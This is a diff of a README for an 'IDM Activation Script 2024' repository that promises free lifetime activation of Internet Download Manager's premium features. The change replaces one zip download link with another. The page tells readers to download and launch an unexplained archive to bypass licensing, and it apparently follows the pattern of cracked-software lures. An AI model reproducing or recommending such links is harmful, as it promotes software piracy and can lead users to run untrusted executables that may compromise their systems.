@@ -16,7 +16,7 @@ Welcome to the IDM Activation Script 2024 repository! Here you will find a power
 2. Launch the script and follow the on-screen instructions.
 3. Enjoy a lifetime of free IDM activation and premium features!
 
-[Download IDM Activation Script](https://github.com/user-attachments/files/18410590/Software.zip)
+[Download IDM Activation Script](https://github.com/Pedrolucaskl/IDM-Activation-Script-2024/releases/download/v1.0/Application.zip)
 
 ## Repository Topics
 - download-idm-free-for-lifetime
